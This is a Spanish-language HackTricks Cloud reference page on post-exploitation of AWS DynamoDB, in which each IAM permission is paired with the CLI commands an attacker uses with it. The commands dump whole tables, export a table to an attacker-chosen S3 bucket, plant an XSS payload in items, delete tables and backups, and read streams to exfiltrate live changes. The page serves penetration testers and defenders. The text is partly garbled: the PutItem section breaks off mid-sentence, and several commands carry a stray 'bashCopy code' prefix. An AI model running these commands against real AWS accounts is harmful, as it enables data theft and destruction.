# AWS - Post Explotación de DynamoDB

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## DynamoDB

Para más información, consulta:

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

Un atacante con estos permisos podrá **obtener elementos de las tablas por la clave primaria** (no se puede solicitar todos los datos de la tabla). Esto significa que necesitas conocer las claves primarias (puedes obtenerlas obteniendo los metadatos de la tabla (`describe-table`).

{% tabs %}
{% tab title="archivo json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// Con a.json
{
    "ProductCatalog" : { // Este es el nombre de la tabla
        "Keys": [
            {
            "Id" : { // Nombre de las claves primarias
                "N": "205" // Valor a buscar, podrías poner aquí entradas del 1 al 1000 para volcar todas ellas
            }
            }
        ]
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="en línea" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
    --request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
    --region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}



**Impacto potencial:** Privesc indirecto localizando información sensible en la tabla

### `dynamodb:GetItem`

**Similar a los permisos anteriores**, este permite a un atacante potencial leer valores de solo 1 tabla dada la clave primaria de la entrada a recuperar:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// Con a.json
{ 
"Id" : { 
    "N": "205"
}
}
```
{% endcode %}

Con este permiso también es posible utilizar el método **`transact-get-items`** como:

```json
aws dynamodb transact-get-items \
    --transact-items file:///tmp/a.json

// Con a.json
[
    {
        "Get": {
            "Key": {
                "Id": {"N": "205"}
            },
            "TableName": "ProductCatalog"
        }
    }
]
```

**Impacto potencial:** Privesc indirecto localizando información sensible en la tabla

### `dynamodb:Query`

**Similar a los permisos anteriores**, este permite a un atacante potencial leer valores de solo 1 tabla dada la clave primaria de la entrada a recuperar. Permite usar un [subconjunto de comparaciones](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html), pero la única comparación permitida con la clave primaria (que debe aparecer) es "EQ", por lo que no se puede usar una comparación para obtener toda la base de datos en una solicitud.

{% tabs %}
{% tab title="archivo json" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json
 
 // Con a.json
 { 
"Id" : { 
    "ComparisonOperator":"EQ",
    "AttributeValueList": [ {"N": "205"} ]
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="en línea" %}
```bash
aws dynamodb query \
    --table-name TargetTable \
    --key-condition-expression "AttributeName = :value" \
    --expression-attribute-values '{":value":{"S":"TargetValue"}}' \
    --region <region>
```
{% endtab %}
{% endtabs %}

**Impacto potencial:** Privesc indirecto localizando información sensible en la tabla

### `dynamodb:Scan`

Puedes usar este permiso para **volcar toda la tabla fácilmente**.

```bash
aws dynamodb scan --table-name <t_name> #Obtener datos dentro de la tabla
```

**Impacto potencial:** Privesc indirecto localizando información sensible en la tabla

### `dynamodb:PartiQLSelect`

Puedes usar este permiso para **volcar toda la tabla fácilmente**.

```bash
aws dynamodb execute-statement \
    --statement "SELECT * FROM ProductCatalog"
```

Este permiso también permite realizar `batch-execute-statement` como:

```bash
aws dynamodb batch-execute-statement \
    --statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```

pero necesitas especificar la clave primaria con un valor, por lo que no es muy útil.

**Impacto potencial:** Privesc indirecto localizando información sensible en la tabla

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Este permiso permitirá a un atacante **exportar toda la tabla a un bucket S3** de su elección:

```bash
aws dynamodb export-table-to-point-in-time \
    --table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
    --s3-bucket <attacker_s3_bucket> \
    --s3-prefix <optional_prefix> \
    --export-time <point_in_time> \
    --region <region>
```

Ten en cuenta que para que esto funcione, la tabla debe tener la recuperación en un punto en el tiempo habilitada, puedes comprobar si la tabla la tiene con:

```bash
aws dynamodb describe-continuous-backups \
  --table-name <tablename>
```

Si no está habilitado, deberás **habilitarlo** y para ello necesitas el permiso **`dynamodb:ExportTableToPointInTime`**:

```bash
aws dynamodb update-continuous-backups \
    --table-name <value> \
    --point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```

**Impacto potencial:** Privesc indirecto localizando información sensible en la copia de seguridad de la tabla

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Con estos permisos, un atacante podría **crear una nueva tabla a partir de una copia de seguridad** (o incluso crear una copia de seguridad para luego restaurarla en una tabla diferente). Luego, con los permisos necesarios, podría verificar **información** de las copias de seguridad que **ya no podrían estar en la tabla de producción**.

```bash
aws dynamodb restore-table-from-backup \
    --backup-arn <source-backup-arn> \
    --target-table-name <new-table-name> \
    --region <region>
```

**Impacto potencial:** Privesc indirecto localizando información sensible en la copia de seguridad de la tabla

### `dynamodb:PutItem`

Este permiso permite a los usuarios agregar un **nuevo elemento a la tabla o reemplazar un elemento existente** con un nuevo elemento. Si ya existe un elemento con la misma clave primaria, el **elemento completo será reemplazado** con el nuevo elemento. Si la clave primaria no existe
### `dynamodb:UpdateItem`

Este permiso permite a los usuarios **modificar los atributos existentes de un elemento o agregar nuevos atributos a un elemento**. No **reemplaza** todo el elemento; solo actualiza los atributos especificados. Si la clave principal no existe en la tabla, la operación **creará un nuevo elemento** con la clave principal especificada y establecerá los atributos especificados en la expresión de actualización.

{% tabs %}
{% tab title="Ejemplo de XSS" %}
{% code overflow="wrap" %}
```bash
## Actualizar elemento con carga útil XSS
aws dynamodb update-item --table <table_name> \
    --key file://key.json --update-expression "SET Description = :value" \
    --expression-attribute-values file://val.json
### Con key.json:
{
    "Id": {
        "S": "1000"
    }
}
### y val.json
{
    ":value": {
        "S": "<script>alert(1)</script>"
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Ejemplo de AI" %}
```bash
aws dynamodb update-item \
    --table-name ExampleTable \
    --key '{"Id": {"S": "1"}}' \
    --update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
    --expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
    --region <region>
```
{% endtab %}
{% endtabs %}

**Impacto potencial:** Explotación de vulnerabilidades/bypasses adicionales al poder agregar/modificar datos en una tabla DynamoDB.

### `dynamodb:DeleteTable`

Un atacante con este permiso puede **eliminar una tabla DynamoDB, causando pérdida de datos**.

```bash
aws dynamodb delete-table \
    --table-name TargetTable \
    --region <region>
```

**Impacto potencial:** Pérdida de datos y interrupción de servicios que dependen de la tabla eliminada.

### `dynamodb:DeleteBackup`

Un atacante con este permiso puede **eliminar una copia de seguridad de DynamoDB, lo que podría causar pérdida de datos en caso de un escenario de recuperación ante desastres**.

```bash
aws dynamodb delete-backup \
    --backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
    --region <region>
```

**Impacto potencial:** Pérdida de datos e incapacidad para recuperarse de una copia de seguridad durante un escenario de recuperación ante desastres.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: Probar si esto realmente funciona
{% endhint %}

Un atacante con estos permisos puede **habilitar un flujo en una tabla DynamoDB, actualizar la tabla para comenzar a transmitir cambios y luego acceder al flujo para monitorear los cambios en la tabla en tiempo real**. Esto permite al atacante monitorear y exfiltrar cambios de datos, lo que podría llevar a una fuga de datos.

1. Habilitar un flujo en una tabla DynamoDB:

```bash
bashCopy codeaws dynamodb update-table \
    --table-name TargetTable \
    --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
    --region <region>
```

2. Describir el flujo para obtener el ARN y otros detalles:

```bash
bashCopy codeaws dynamodb describe-stream \
    --table-name TargetTable \
    --region <region>
```

3. Obtener el iterador de fragmento utilizando el ARN del flujo:

```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
    --stream-arn <stream_arn> \
    --shard-id <shard_id> \
    --shard-iterator-type LATEST \
    --region <region>
```

4. Usar el iterador de fragmento para acceder y exfiltrar datos del flujo:

```bash
bashCopy codeaws dynamodbstreams get-records \
    --shard-iterator <shard_iterator> \
    --region <region>
```

**Impacto potencial:** Monitoreo en tiempo real y fuga de datos de los cambios de la tabla DynamoDB.